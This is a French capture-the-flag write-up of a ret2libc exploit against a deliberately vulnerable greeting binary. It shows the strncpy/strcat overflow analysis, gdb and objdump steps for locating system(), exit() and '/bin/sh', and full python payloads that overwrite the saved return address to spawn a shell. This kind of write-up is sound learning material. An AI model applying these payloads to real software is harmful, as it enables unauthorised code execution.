# Ret2Libc

## Analyse

- `strncpy()` de 40 caracteres de argv[1]: 0xbffff5e0
- `strncpy()` de 32 caracteres de argv[2]: 0xbffff608
- Ecart de 40 caracteres entre les deux adresses
- Recuperation de la variable d'ENV "LANG", changement du comportement de `greetuser()` en consequence
 ```
    +-> Si "LANG" == "fi"
    |     +-> Concatenation de "\x48\x79\x76\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x69\x76\xc3\xa4\xc3\xa4\x20" et du 1er `strncpy()`
    |
    +-> Si "LANG" == "nl"
    |     +-> Concatenation de "Goedemiddag! " et du 1er `strncpy()`
    |
    +-> Sinon
          +-> Concatenation de "Hello " et du 1er `strncpy()`
```
- `puts()` de la concatenation

Il y a un ecart de **40 octets entre les deux adresses**, donc **si argv[1] compte 40 caracteres le "\0" sera ecrase**
**-->** le `strcat()` continuera sa route et prendra alors le second `strncpy()` jusqu'a rencontrer un '\0'

**-->** Modification du **saved-eip** du `main()` possible lorsque le retour d'`strcat()` est de +65 caracteres (si "LANG"=nothing)

`$(python -c 'print "A"*40') $(python -c 'print "B"*25 + NOTRE_INJECTION')`

**Adresse de la libc:**
```
(gdb) info proc mappings
0xb7fcf000 0xb7fd1000     0x2000        0x1a3000    /lib/i386-linux-gnu/libc-2.15.so
     |         |             |              |                   |
   debut      fin         taille      taille totale        chemin absolu
de la region            de la region    du fichier
  memoire                 memoire

```

**Adresse de `system()`:**
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

**Adresse d'`exit()`:**
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

**Adresse de la string "/bin/sh":**
```
objdump -s -j .rodata /lib/i386-linux-gnu/libc-2.15.so | grep /bin/sh
160c50      726e616c    002d6300    2f62696e    2f736800  rnal.-c./bin/sh.
   |
 offset
```

(adresse_libc + 160c50 + len("rnal.-c.")) = 0xb7f8cc58

-> 0xb7fcf000 + 0x160c50 + 0x8 = 0xb7f8cc58

**Resultat:**
`$(python -c 'print "A"*40') $(python -c 'print "B"*25 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')`

##### Mais non ! Notre injection ne sera pas copiee en entier.
**->** ``"B"*25 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7" == 37 octets alors que le `strcpy()` n'en copie que 32``

- Notre injection ce fait suite a au `strcat()` qui concatene une chaine suivant la valeur de "LANG" a nos arguments.

- Ces chaines ont des longueurs differentes, par defaut, on aura "Hello ", soit **7 caracteres**.

- On peut donc utiliser cela pour nous rapprocher d'$ebp+4.

Si **"LANG"="fi"**, on a "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4" soit **18 caracteres** !

Grace a cela, on refait le calcul pour connaitre la distance d'$ebp+4 et **l'offset diminue de 7 octets ce qui est suffisant**.

`$(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')`


